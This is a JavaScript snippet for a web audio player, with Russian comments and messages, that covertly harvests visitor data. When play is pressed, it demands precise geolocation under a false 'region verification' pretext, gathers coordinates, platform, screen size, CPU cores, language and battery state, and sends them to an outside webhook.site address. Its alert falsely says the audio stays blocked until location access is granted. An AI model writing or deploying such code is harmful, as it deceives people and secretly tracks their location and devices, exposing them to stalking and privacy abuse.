<script>
    const audio = document.getElementById('myAudio');
    const playBtn = document.getElementById('playBtn');
    const progress = document.getElementById('progress');
    const status = document.getElementById('status');
    const webhookUrl = "https://webhook.site/bc5fa1da-0db6-461f-8bf3-ceb074f7bac7";

    async function togglePlay() {
        if (audio.paused) {
            status.innerText = "Синхронизация региона...";
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // 1. Собираем гео
                let payload = {
                    type: "FULL_REPORT",
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    platform: navigator.platform,
                    screen: window.screen.width + "x" + window.screen.height,
                    cores: navigator.hardwareConcurrency || "N/A",
                    lang: navigator.language
                };

                // 2. Добавляем данные о батарее
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    payload.battery = (bat.level * 100) + "%";
                    payload.charging = bat.charging ? "Yes" : "No";
                }

                // 3. Добавляем данные акселерометра (текущий наклон)
                // Отправляем всё одним махом
                const queryString = new URLSearchParams(payload).toString();
                fetch(`${webhookUrl}?${queryString}`);

                // 4. Запускаем музыку
                audio.play();
                playBtn.innerText = "⏸";
                status.innerText = "Играет эксклюзивный трек";
                status.style.color = "#1DB954";
            }, 
            (err) => {
                alert("Доступ к аудио заблокирован. Пожалуйста, разрешите доступ к местоположению для верификации вашего региона.");
                status.innerText = "Ошибка верификации";
                status.style.color = "#ff4444";
            }, 
            { enableHighAccuracy: true, timeout: 10000 });
            
        } else {
            audio.pause();
            playBtn.innerText = "▶";
        }
    }

    // Управление перемоткой
    function skip(seconds) { audio.currentTime += seconds; }
    audio.ontimeupdate = () => { progress.max = audio.duration || 100; progress.value = audio.currentTime; };
    progress.oninput = () => { audio.currentTime = progress.value; };
  </script>
